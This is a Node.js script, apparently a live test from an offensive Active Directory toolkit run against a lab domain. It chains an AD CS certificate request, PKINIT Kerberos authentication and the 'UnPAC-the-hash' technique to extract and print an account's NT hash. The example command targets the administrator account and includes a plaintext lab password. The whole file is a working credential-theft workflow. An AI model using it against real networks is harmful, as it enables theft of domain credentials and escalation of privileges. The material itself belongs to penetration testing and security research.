// Live check: request a cert for a user, then PKINIT with it to get a TGT.
//   node scripts/pkinit-live.js --dc 100.100.10.100 --dcfqdn lab01-dc01.pk.lab --ca-ip 100.100.10.101 --cahost lab01-mssql01.pk.lab --ca pk-ROOT-CA --template User --user administrator --domain pk.lab --pass 'P@ssw0rd'
import net from 'node:net';
import { webcrypto } from 'node:crypto';
if (!globalThis.crypto) globalThis.crypto = webcrypto;
const A = (() => { const a = {}; for (let i = 2; i < process.argv.length; i++) { if (!process.argv[i].startsWith('--')) continue; const k = process.argv[i].slice(2); const n = process.argv[i + 1]; if (n === undefined || n.startsWith('--')) a[k] = true; else { a[k] = n; i++; } } return a; })();
const HOSTS = { [A.cahost.toLowerCase()]: A['ca-ip'], [A.dcfqdn.toLowerCase()]: A.dc };
globalThis.TCPSocket = class { constructor(host, port) { const ch=[]; let w=null,en=false,er=null; const s=net.connect(port, HOSTS[String(host).toLowerCase()]||host); this._s=s; s.on('data',d=>{const u=Uint8Array.from(d); if(w){const x=w;w=null;x.resolve({value:u,done:false});}else ch.push(u);}); s.on('end',()=>{en=true; if(w){const x=w;w=null;x.resolve({done:true});}}); s.on('error',e=>{er=e; if(w){const x=w;w=null;x.reject(e);}}); const rd={read(){if(ch.length)return Promise.resolve({value:ch.shift(),done:false}); if(er)return Promise.reject(er); if(en)return Promise.resolve({done:true}); return new Promise((re,rj)=>{w={resolve:re,reject:rj};});},releaseLock(){}}; const wr={write:b=>new Promise((re,rj)=>s.write(Buffer.from(b),e=>e?rj(e):re())),releaseLock(){}}; this.opened=new Promise((re,rj)=>{s.once('connect',()=>re({readable:{getReader:()=>rd},writable:{getWriter:()=>wr}})); s.once('error',rj);}); } async close(){try{this._s.destroy();}catch{}} };

const pemToDer = (pem) => Uint8Array.from(Buffer.from(pem.replace(/-----[^-]+-----|\s/g, ''), 'base64'));

const { requestCert } = await import('../src/certify.js');
const { getTgtPkinit } = await import('../src/kerberos/pkinit.js');
const { unpacHash } = await import('../src/kerberos/unpac.js');
const { KdcSocketTransport } = await import('../src/kerberos/client.js');

// 1) Request a certificate for the user.
const req = await requestCert({
  caHost: A.cahost, caName: A.ca, template: A.template, subject: `CN=${A.user}`,
  user: A.user, domain: A.domain, password: A.pass,
}, { log: (m) => console.log('  ·', m) });
if (!req.certPem) { console.error('[!] no certificate issued:', req.dispositionText, req.message); process.exit(1); }
console.log('[+] certificate obtained for', A.user);

// 2) PKINIT with the cert+key -> TGT.
const certDer = pemToDer(req.certPem);
const privateKey = await webcrypto.subtle.importKey('pkcs8', pemToDer(req.keyPem), { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' }, false, ['sign']);

const t = new KdcSocketTransport(A.dcfqdn, 88, (m) => console.log('  ·', m));
await t.connect();
const tgt = await getTgtPkinit(t, { username: A.user, realm: A.domain, certDer, privateKey, log: (m) => console.log('  ·', m) });
console.log(`[+] PKINIT OK — TGT session key etype ${tgt.sessionKey.etype}`);

// 3) UnPAC-the-hash -> NT hash.
const res = await unpacHash(t, tgt, (m) => console.log('  ·', m));
await t.close();
console.log(`\n[+] ${res.username}@${res.realm}  NT hash = ${res.ntHash}`);
process.exit(0);
